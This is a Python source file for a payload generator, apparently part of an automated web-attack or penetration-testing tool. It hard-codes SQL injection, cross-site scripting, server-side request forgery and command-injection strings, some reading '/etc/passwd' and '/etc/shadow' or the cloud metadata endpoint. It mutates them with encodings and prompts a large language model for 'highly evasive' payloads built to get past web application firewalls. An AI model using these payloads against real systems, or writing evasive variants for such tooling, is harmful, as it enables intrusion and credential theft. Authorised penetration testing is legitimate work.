import random
import base64
import logging
from typing import List, Dict, Any, Union

logger = logging.getLogger(__name__)

class PayloadGenerator:
    def __init__(self, llm_enabled: bool = False):
        self.llm_enabled = llm_enabled
        self.baseline_payloads = {
            "SQLI": ["' OR 1=1--", "' UNION SELECT NULL--", "admin'--"],
            "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
            "SSRF": ["http://169.254.169.254/latest/meta-data/", "file:///etc/passwd"],
            "CMDI": [";sleep 5", "| id", "`cat /etc/shadow`"]
        }

    async def generate(self, vuln_class: str, context: Dict[str, Any]) -> List[str]:
        """Synthesize payloads using static, mutation, and LLM layers."""
        logger.info(f"[PAYLOAD_GEN] Generating advanced weapons for {vuln_class}")
        
        # 1. Base Payloads
        payloads = self.baseline_payloads.get(vuln_class, ["test_payload"])
        
        # 2. Mutation Engine (Double URL Encoding, Base64 wraps, etc.)
        mutated = self._apply_mutations(payloads)
        
        # 3. LLM Layer (Actual AI Hook)
        from awap.core.config import settings
        if settings.LLM_API_KEY:
            try:
                llm_payloads = await self._generate_llm_payloads(vuln_class, context, settings)
                mutated.extend(llm_payloads)
            except Exception as e:
                logger.error(f"[PAYLOAD_GEN] LLM Generation Pipeline Failed: {e}")
            
        return list(set(mutated))

    def _apply_mutations(self, payloads: List[str]) -> List[str]:
        results = list(payloads)
        for p in payloads:
            results.append(p.replace(" ", "%20").replace("'", "%27"))
            if "script" in p:
                results.append(p.upper()) # Capitalize tags
        return results

    async def _generate_llm_payloads(self, vuln_class: str, context: Dict[str, Any], settings) -> List[str]:
        """Ask Anthropic/OpenAI to generate a novel bypass based on context via actual SDK."""
        import json
        
        prompt = f"""
        You are an elite penetration testing engine.
        Target Vulnerability: {vuln_class}
        Context Rules: {json.dumps(context)}
        
        Generate exactly 3 extremely advanced, highly evasive payload strings designed to bypass WAFs for this vulnerability class.
        Return ONLY a raw JSON array of strings. Do not include markdown, explanations, or any other text.
        Example format: ["payload1", "payload2", "payload3"]
        """
        
        try:
            if settings.LLM_PROVIDER.lower() == "anthropic":
                from anthropic import AsyncAnthropic
                client = AsyncAnthropic(api_key=settings.LLM_API_KEY)
                response = await client.messages.create(
                    model="claude-3-haiku-20240307",
                    max_tokens=200,
                    messages=[{"role": "user", "content": prompt}]
                )
                output_text = response.content[0].text
            else:
                import openai
                client = openai.AsyncOpenAI(api_key=settings.LLM_API_KEY)
                response = await client.chat.completions.create(
                    model="gpt-3.5-turbo",
                    messages=[{"role": "user", "content": prompt}]
                )
                output_text = response.choices[0].message.content
                
            payloads = json.loads(output_text.strip("` \n"))
            if isinstance(payloads, list) and all(isinstance(x, str) for x in payloads):
                 return payloads
        except Exception as e:
            logger.warning(f"Failed to parse LLM payloads: {e}")
            
        return []
